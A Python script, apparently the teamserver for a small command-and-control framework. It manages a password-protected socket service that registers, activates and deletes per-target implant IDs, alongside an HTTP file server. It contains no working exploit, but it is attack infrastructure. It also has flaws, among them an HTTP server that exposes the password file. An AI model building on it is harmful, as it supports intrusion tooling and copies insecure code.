from asyncio.windows_events import NULL
from concurrent.futures import thread
import datetime
import os
import random
import shutil
import socket
import json
import http.server
import socketserver
import threading
from time import time
from tracemalloc import stop

# flag = "X8KOy4"
# flag=input("请输入URL：")
# time=float (input("心跳时间："))
# payload = "whoami"
ts_pool = []
baseurl = "127.0.0.1"  # teamserver服务启动地址
HTTP_PORT = 8000  # http服务端口


def generate_random_str(s=6):
    random_str = ''
    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
    for i in range(s):
        random_str += base_str[random.randint(0, 61)]
    return random_str


# # 以server.py为模板，生成新的文件
# def create(flag, time, payload, baseurl):
#     with open("server.py", "r") as f:
#         with open("server_"+flag+".py", "w") as g:
#             for line in f.readlines():
#                 if "flag=" in line:
#                     line = "flag = \""+flag+"\"\n"
#                 if "time=" in line:
#                     line = "time = "+str(time)+"\n"
#                 if "payload=" in line:
#                     line = "payload = \""+payload+"\"\n"
#                 if "baseurl=" in line:
#                     line = "baseurl = \""+baseurl+"\"\n"
#                 g.write(line)
#     print("已生成新的server.py文件")


def add():
    r = generate_random_str()
    # 创建名为r的空文件
    with open('./server/'+r, 'a+') as f:
        f.write("")
    print("已创建：", r)
    with open("log", 'a+') as f:
        f.write('flag:'+r+'    target:'+baseurl+'\n')
    print("已写入log：", r)
    # create(r, time, payload, baseurl)
    # print("已生成新的server.py文件")


def pwd():
    r2 = generate_random_str(12)
    with open("pwd", 'w') as p:
        p.write(r2)
    print("您的TeamServer密码为：", r2, "请妥善保存！")
# 激活server


def alive(flag):
    with open('log', 'r') as f:
        with open('log.bak', 'w') as g:
            for line in f.readlines():
                if flag not in line:
                    g.write(line)
    shutil.move('log.bak', 'log')
    os.rename('./server/'+flag, './server/'+flag+"alive")
    print("已激活：", flag)


def delete(flag):
    # 检测文件是否存在
    if os.path.exists('./server/'+flag):
        os.remove('./server/'+flag)
        print("已删除未激活的server：", flag)
    elif os.path.exists('./server/'+flag+"alive"):
        # 删除server文件夹下的flag文件
        os.remove('./server/'+flag+"alive")
        print("已删除：", flag)
    else:
        print("没有存在的server，可能输入了异常字符！")


def getlist():
    with open("log", "r") as f:
        txt = f.read()
        if txt == "":
            return "暂无数据"
    return txt


def httpserver():

    Handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTP_PORT), Handler) as httpd:
        print("HTTP server port", HTTP_PORT)
        httpd.serve_forever()


def command(conn):
    while True:
        msg = conn.recv(1024).decode()
        if msg == "getlist":
            lists = getlist()
            conn.send(bytes(lists.encode()))
            # 清空msg
            msg = ""
            continue
        elif msg == "add":
            add()
            msg = ""
            continue
        elif msg == "del":

            msg2 = conn.recv(1024).decode()
            print(msg2)
            delete(str(msg2))
            msg = ""
            continue
        elif msg == "test":
            def excmd():
                if msg == "test":

                    conn.send(bytes("server---ok".encode()))
                    return "client---ok"
            excmd()
            msg = ""
            continue
        elif msg == "alive":
            msg2 = conn.recv(1024).decode()

            alive(msg2)
            msg = ""
            continue

        elif msg == "exit":
            print("一个用户退出了服务器", datetime.datetime.now())
            conn.close()
            break


def tserver(addr):
    sk = socket.socket()
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sk.bind((addr, 9000))

    print("正在启动服务器......\n")
    sk.listen()

    print("启动成功")
    pwd()  # 随机生成密码
    while True:

        conn, addr = sk.accept()

        msg = conn.recv(1024).decode()
        sign = False
        with open("pwd", "r") as fp:
            for line in fp:
                lpwd = line
                if msg != lpwd:
                    sign == False
                    res = {"code": 0}
                    res_msg = json.dumps(res).encode()
                    conn.send(res_msg)
                    break
                else:
                    res = {"code": 1}

                    res_msg = json.dumps(res).encode()
                    conn.send(res_msg)
                    sign = True
                    print("一个用户登录了服务器", datetime.datetime.now())

                ts_pool.append(conn)
                thread = threading.Thread(target=command, args=(conn,))
                thread.setDaemon(True)
                thread.start()


t = threading.Thread(target=tserver, args=(baseurl,))

t.start()
httpserver()
